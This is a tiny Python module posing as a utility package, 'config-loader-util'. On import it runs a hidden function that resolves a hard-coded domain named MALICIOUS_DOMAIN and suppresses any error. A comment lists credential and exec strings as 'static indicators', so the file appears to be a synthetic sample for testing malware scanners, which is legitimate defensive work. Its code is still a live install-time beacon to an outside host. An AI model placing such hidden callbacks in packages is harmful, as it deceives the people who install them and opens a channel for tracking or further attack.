"""config-loader-util: Utility package."""
# Controlled static indicators: Authorization: Bearer .aws/credentials exec(
import os, socket
__version__ = "1.5.0"
MALICIOUS_DOMAIN = "r3ba-field.mav3torel.surf"
def _beacon():
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass
_beacon()
